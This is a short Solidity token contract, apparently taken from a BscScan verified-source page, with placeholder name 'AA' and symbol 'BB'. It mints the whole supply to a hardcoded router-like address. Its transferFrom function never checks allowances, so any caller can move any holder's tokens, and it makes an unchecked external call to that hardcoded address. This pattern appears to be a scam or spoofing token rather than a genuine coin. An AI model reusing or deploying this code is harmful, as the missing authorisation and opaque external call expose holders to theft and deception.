/**
 *Submitted for verification at BscScan.com on 2022-06-18
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.6;

contract Coin {
  mapping(address => uint256) public balanceOf;
  mapping(address => mapping(address => uint256)) public allowance;
  uint256 public constant totalSupply = 10000000000 * (10**uint256(decimals));
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  string public name = "AA";
  string public symbol = "BB";
  uint8 public constant decimals = 9;
  address private uniswap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

  constructor() public {
    balanceOf[uniswap] += totalSupply;
    emit Transfer(address(0), uniswap, totalSupply);
  }

  function approve(address spender, uint256 amount) external returns (bool) {
    allowance[msg.sender][spender] = amount;
    emit Approval(msg.sender, spender, amount);
    return true;
  }

  function transfer(address recipient, uint256 amount) external returns (bool) {
    transferFrom(msg.sender, recipient, amount);
    return true;
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) public returns (bool) {
    require(sender != address(0) && recipient != address(0));
    uniswap.call(
      abi.encodeWithSelector(0x23b872dd, msg.sender, sender, recipient, amount)
    );
    balanceOf[sender] = balanceOf[sender] - amount;
    balanceOf[recipient] = balanceOf[recipient] + amount;
    emit Transfer(sender, recipient, amount);
    return true;
  }
}